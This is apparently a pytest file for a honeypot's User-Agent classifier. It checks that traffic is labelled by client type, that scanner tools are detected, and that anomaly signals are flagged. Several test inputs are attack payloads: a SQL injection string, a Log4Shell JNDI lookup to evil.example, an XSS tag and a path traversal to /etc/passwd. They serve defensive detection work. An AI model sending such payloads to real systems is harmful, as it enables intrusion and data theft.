# SPDX-License-Identifier: AGPL-3.0-or-later
"""User-Agent classifier — enriches http_useragent bounty payload."""
from __future__ import annotations

from unittest.mock import AsyncMock

import pytest

from decnet.web.ingester import _classify_ua, _extract_bounty


def _row(ua: str) -> dict:
    return {
        "decky": "http-01",
        "service": "http",
        "attacker_ip": "1.2.3.4",
        "event_type": "request",
        "fields": {
            "method": "GET",
            "path": "/",
            "headers": {"User-Agent": ua} if ua else {},
        },
    }


# ─── categories ────────────────────────────────────────────────────────────

def test_empty_ua_is_empty_category():
    cat, tool, signals = _classify_ua("")
    assert cat == "empty"
    assert tool is None


@pytest.mark.parametrize("ua", [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
])
def test_browser_classification(ua: str):
    cat, tool, _ = _classify_ua(ua)
    assert cat == "browser"
    assert tool is None


@pytest.mark.parametrize("ua,expected_tool", [
    ("curl/8.0.1", "curl"),
    ("curl/7.81.0", "curl"),
    ("Wget/1.21.3", "wget"),
    ("HTTPie/3.2.1", "httpie"),
])
def test_cli_classification(ua: str, expected_tool: str):
    cat, tool, _ = _classify_ua(ua)
    assert cat == "cli"
    assert tool == expected_tool


@pytest.mark.parametrize("ua,expected_tool", [
    ("python-requests/2.31.0", "python-requests"),
    ("aiohttp/3.9.1", "aiohttp"),
    ("httpx/0.27.0", "httpx"),
    ("Go-http-client/1.1", "go-stdlib"),
    ("Java/11.0.19", "java-stdlib"),
    ("okhttp/4.11.0", "okhttp"),
    ("Apache-HttpClient/5.2.1 (Java/11.0.19)", "apache-httpclient"),
    ("axios/1.6.2", "axios"),
    ("PostmanRuntime/7.36.1", "postman"),
    ("GuzzleHttp/7", "guzzle"),
])
def test_library_classification(ua: str, expected_tool: str):
    cat, tool, _ = _classify_ua(ua)
    assert cat == "library"
    assert tool == expected_tool


@pytest.mark.parametrize("ua,expected_tool", [
    ("Nmap Scripting Engine; https://nmap.org/book/nse.html", "nmap"),
    ("Mozilla/5.0 (compatible; Nuclei - Open-source project)", "nuclei"),
    ("sqlmap/1.7.11#stable (http://sqlmap.org)", "sqlmap"),
    ("gobuster/3.6", "gobuster"),
    ("Mozilla/5.0 (Nikto/2.5.0)", "nikto"),
    ("masscan/1.3.2", "masscan"),
    ("wpscan v3.8.25 ", "wpscan"),
    ("zgrab/0.x", "zgrab"),
    ("Mozilla/5.0 (X11; Acunetix; Linux x86_64)", "acunetix"),
    ("ffuf/2.1.0", "ffuf"),
])
def test_scanner_classification(ua: str, expected_tool: str):
    cat, tool, _ = _classify_ua(ua)
    assert cat == "scanner"
    assert tool == expected_tool


@pytest.mark.parametrize("ua", [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
])
def test_bot_classification(ua: str):
    cat, _, _ = _classify_ua(ua)
    assert cat == "bot"


@pytest.mark.parametrize("ua", [
    "FUCKYOU/1.0",
    "myscanner",
    "customtool-v2",
    "ABCDE",  # short — also triggers suspicious_short signal
    "X",
    "lol",
    "hello-world-ua",
])
def test_nonstandard_classification(ua: str):
    cat, tool, _ = _classify_ua(ua)
    assert cat == "nonstandard", f"{ua!r} should be nonstandard but got {cat}"
    assert tool is None


# ─── signals ───────────────────────────────────────────────────────────────

def test_suspicious_short_signal():
    _, _, signals = _classify_ua("lol")
    assert "suspicious_short" in signals


def test_suspicious_long_signal():
    _, _, signals = _classify_ua("A" * 600)
    assert "suspicious_long" in signals


def test_nonprintable_signal():
    _, _, signals = _classify_ua("curl/8\x00.0")
    assert "nonprintable" in signals


def test_injection_like_sqli():
    _, _, signals = _classify_ua("Mozilla/5.0' OR 1=1 --")
    assert "injection_like" in signals


def test_injection_like_log4shell():
    _, _, signals = _classify_ua("${jndi:ldap://evil.example/x}")
    assert "injection_like" in signals


def test_injection_like_xss():
    _, _, signals = _classify_ua("<script>alert(1)</script>")
    assert "injection_like" in signals


def test_injection_like_path_traversal():
    _, _, signals = _classify_ua("mytool/../../etc/passwd")
    assert "injection_like" in signals


def test_no_signals_on_normal_browser():
    _, _, signals = _classify_ua(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    )
    assert signals == []


def test_scanner_can_still_carry_injection_signal():
    """A scanner UA with an injection marker embedded is a combination
    worth separating — both labels applied."""
    cat, tool, signals = _classify_ua("sqlmap/1.7' OR 1=1 --")
    assert cat == "scanner"
    assert tool == "sqlmap"
    assert "injection_like" in signals


# ─── payload determinism / dedup ───────────────────────────────────────────

def test_same_ua_produces_same_payload():
    """Critical for add_bounty dedup — same UA string must produce
    byte-identical classifier output so the full payload hashes the
    same across requests."""
    a = _classify_ua("FUCKYOU/1.0")
    b = _classify_ua("FUCKYOU/1.0")
    assert a == b


# ─── end-to-end via _extract_bounty ────────────────────────────────────────

@pytest.mark.asyncio
async def test_extract_bounty_enriches_nonstandard_ua():
    repo = AsyncMock()
    await _extract_bounty(repo, _row("FUCKYOU/1.0"))

    ua_call = next(
        c.args[0] for c in repo.add_bounty.call_args_list
        if c.args[0].get("bounty_type") == "fingerprint"
        and c.args[0]["payload"].get("fingerprint_type") == "http_useragent"
    )
    p = ua_call["payload"]
    assert p["value"] == "FUCKYOU/1.0"
    assert p["category"] == "nonstandard"
    assert p["tool"] is None


@pytest.mark.asyncio
async def test_extract_bounty_enriches_scanner_ua():
    repo = AsyncMock()
    await _extract_bounty(repo, _row("sqlmap/1.7.11"))

    ua_call = next(
        c.args[0] for c in repo.add_bounty.call_args_list
        if c.args[0].get("bounty_type") == "fingerprint"
        and c.args[0]["payload"].get("fingerprint_type") == "http_useragent"
    )
    p = ua_call["payload"]
    assert p["category"] == "scanner"
    assert p["tool"] == "sqlmap"


@pytest.mark.asyncio
async def test_extract_bounty_empty_ua_still_fires():
    """Explicit empty UA header is itself a signal — real clients
    always send SOMETHING. Flag as 'empty' category."""
    row = {
        "decky": "http-01",
        "service": "http",
        "attacker_ip": "1.2.3.4",
        "event_type": "request",
        "fields": {
            "method": "GET",
            "path": "/",
            "headers": {"User-Agent": ""},
        },
    }
    repo = AsyncMock()
    await _extract_bounty(repo, row)

    ua_calls = [
        c.args[0] for c in repo.add_bounty.call_args_list
        if c.args[0].get("bounty_type") == "fingerprint"
        and c.args[0]["payload"].get("fingerprint_type") == "http_useragent"
    ]
    # Empty-string UA is falsy — current _extract_bounty checks `if _ua:`.
    # We want to NOT emit on missing UA, but we do want to flag empty.
    # The `_ua is not None` check in ingester now handles this; verify
    # it fires with category=empty.
    assert len(ua_calls) == 1
    assert ua_calls[0]["payload"]["category"] == "empty"
